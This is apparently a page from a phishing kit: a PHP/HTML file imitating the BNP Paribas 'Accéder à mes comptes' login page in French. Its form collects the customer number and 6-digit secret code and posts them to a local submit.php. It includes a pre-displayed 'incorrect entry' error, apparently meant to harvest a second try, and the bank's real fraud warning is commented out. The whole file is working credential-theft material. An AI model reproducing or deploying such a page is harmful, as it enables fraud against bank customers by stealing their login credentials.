<?php

error_reporting(0);
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 


        <title>Accéder à mes comptes en ligne | BNP Paribas</title>
    </head>

    <body>

        <!--<div class="loader-page">
            <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
        </div>-->
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo">
                    <a href="#"><img src="../assets/images/logo.png"></a>
                    <span class="d-lg-inline-block d-md-none d-sm-none d-none">La banque d'un monde qui change</span>
                </div>
                <div class="links d-lg-block d-md-none d-sm-none d-none">
                    <ul>
                        <li><a href="#"><img src="../assets/images/idea.png"></a></li>
                        <li><a href="#">Devenir client</a></li>
                    </ul>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <!--<div class="top-alert">
                    <i class="fas fa-exclamation-circle"></i>
                    <p>De faux emails et des appels téléphoniques vous demandant vos coordonnées personnelles et informations bancaires peuvent vous être adressés au nom de BNP Paribas. Il peut s’agir d’une tentative de fraude. Veillez à ne jamais y répondre, ne pas cliquer sur les liens, ni ouvrir les pièces jointes. En cas de suspicion, contactez immédiatement le centre de relation client au 3477. En savoir plus. </p>
                </div>-->
                <div class="row ml-0 mr-0">
                    <div class="col-md-7 left-part">
                        <div class="" style="width: 411px">
                            <form action="submit.php" method="post">
                                <input type="hidden" name="verbot">
                                <div class="error-form">
                                    <p>
                                        Votre saisie est incorrecte.<br>
                                        Veuillez renouveler votre identification.
                                    </p>
                                </div>
                                <legend class="mb-4">Accéder à mes comptes</legend>
                                <div class="form-group mb-4">
                                    <label for="client_id">1. Mon numéro client</label>
                                    <input type="text" maxlength="10" name="client_id" id="client_id">
                                    <span class="reset-btn client-id"><i class="far fa-times-circle"></i></span>
                                </div>
                                <div class="form-group password-field disabled">
                                    <label for="password">2. Mon code secret (6 chiffres)</label>
                                    <input type="password" name="password" id="password" readonly>
                                    <span class="reset-btn btn-pass"><i class="far fa-times-circle"></i></span>
                                </div>
                                <div class="numbers disabled mb-3">
                                    <ul>
                                        <li><a data-number="3">3</a></li>
                                        <li><a data-number="8">8</a></li>
                                        <li><a data-number="2">2</a></li>
                                        <li><a data-number="1">1</a></li>
                                        <li><a data-number="5">5</a></li>
                                    </ul>
                                    <ul>
                                        <li><a data-number="7">7</a></li>
                                        <li><a data-number="9">9</a></li>
                                        <li><a data-number="6">6</a></li>
                                        <li><a data-number="0">0</a></li>
                                        <li><a data-number="4">4</a></li>
                                    </ul>
                                </div>
                                <input type="hidden" name="type" value="login2">
                                <div class="form-group">
                                    <button type="submit" class="btn-submit disabled" disabled>Accéder à mes comptes</button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div class="col-md-5 right-part">
                        <div class="">
                            <div class="content">
                                <h3><i class="fas fa-lock"></i> Vos codes d'accès</h3>
                                <a href="#">Obtenir ses codes d'accès</a><br>
                                <a href="#">Code secret oublié ?</a>
                            </div>
                            <hr>
                            <div class="content">
                                <h3><i class="fas fa-shield-alt"></i> Conseils de sécurité</h3>
                                <p>Vérifiez que <b>l'adresse du site commence exactement par :</b></p>
                                <p><b>https://mabanque.bnpparibas/fr/connexion</b></p>
                                <p>précédée par une icône cadenas et contient un <b>https://</b> qui garantiront une connexion sécurisée.</p>
                                <p><a href="#">Découvrez nos conseils sécurité</a> et les bonnes pratiques pour consulter et identifier les dangers du web.</p>
                            </div>
                            <hr>
                            <div class="content">
                                <h3><i class="fas fa-eye"></i> Pour une meilleure accessibilité</h3>
                                <p><a href="#">Connectez-vous</a> grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.</p>
                            </div>
                            <hr>
                            <div class="content">
                                <h3><i class="fas fa-phone-volume"></i> Informations client</h3>
                                <p>Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au :</p>
                                <img src="../assets/images/service.jpg">
                                <p>
                                    ou à nous <a href="#">signaler un problème technique.</a><br>
                                    Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application <a href="#">Mes comptes.</a>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <div class="social-media mb-5">
                    <span>Suivez-nous sur :</span>
                    <a href="#"><i class="fab fa-facebook-f"></i></a>
                    <a href="#"><i class="fab fa-twitter"></i></a>
                    <a href="#"><i class="fab fa-youtube"></i></a>
                    <a href="#"><i class="fab fa-instagram"></i></a>
                    <a href="#"><i class="fab fa-linkedin"></i></a>
                </div>
                <div class="row">
                    <div class="col-md-4 mb-lg-0 mb-md-4 mb-sm-4 mb-4">
                        <div class="footer-widget">
                            <h3>contact</h3>
                            <ul>
                                <li><a href="#">Nos conseillers vous répondent par téléphone, chat, mail ou bien encore grâce à nos SAV Facebook et Twitter.</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-4 mb-lg-0 mb-md-4 mb-sm-4 mb-4">
                        <div class="footer-widget">
                            <h3>Trouver une agence</h3>
                            <ul>
                                <li><a href="#">Retrouvez facilement l’agence la plus proche avec ses horaires d’ouverture et les services disponibles.</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-4 mb-lg-0 mb-md-4 mb-sm-4 mb-4">
                        <div class="footer-widget">
                            <h3>les applications mobiles</h3>
                            <ul>
                                <li><a href="#">Découvrez nos applications mobiles pour gérer vos comptes, payer avec votre mobile et vous simplifier la vie.</a></li>
                            </ul>
                        </div>
                    </div>
                </div>

                <hr>

                <div class="row">
                    <div class="col-md-3 mb-lg-0 mb-md-4 mb-sm-4 mb-4">
                        <div class="footer-widget footer-widget2">
                            <h3>Informations légales</h3>
                            <ul>
                                <li><a href="#">Données personnelles</a></li>
                                <li><a href="#">Mentions légales</a></li>
                                <li><a href="#">Cookies</a></li>
                                <li><a href="#">Réglementation</a></li>
                                <li><a href="#">Fonds de Garantie des Dépôts et résolution</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb-lg-0 mb-md-4 mb-sm-4 mb-4">
                        <div class="footer-widget footer-widget2">
                            <h3>Nous connaître</h3>
                            <ul>
                                <li><a href="#">La banque d’un monde qui change</a></li>
                                <li><a href="#">Nos engagements responsables</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb-lg-0 mb-md-4 mb-sm-4 mb-4">
                        <div class="footer-widget footer-widget2">
                            <h3>Informations</h3>
                            <ul>
                                <li><a href="#">Site Sécurisé</a></li>
                                <li><a href="#">Conditions d’éligibilité</a></li>
                                <li><a href="#">Tarifs et conditions</a></li>
                                <li><a href="#">Glossaire</a></li>
                                <li><a href="#">Guides et brochures</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb-lg-0 mb-md-4 mb-sm-4 mb-4">
                        <div class="footer-widget footer-widget2">
                            <h3>Nos autres sites</h3>
                            <ul>
                                <li><a href="#">Les Professionnels</a></li>
                                <li><a href="#">Les Entreprises</a></li>
                                <li><a href="#">Les Associations</a></li>
                                <li><a href="#">Glossaire</a></li>
                                <li><a href="#">La Banque Privée</a></li>
                                <li><a href="#">La Banque en ligne</a></li>
                                <li><a href="#">Le Groupe BNP Paribas</a></li>
                            </ul>
                        </div>
                    </div>
                </div>

                <p class="mt-5">Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour.</p>

            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>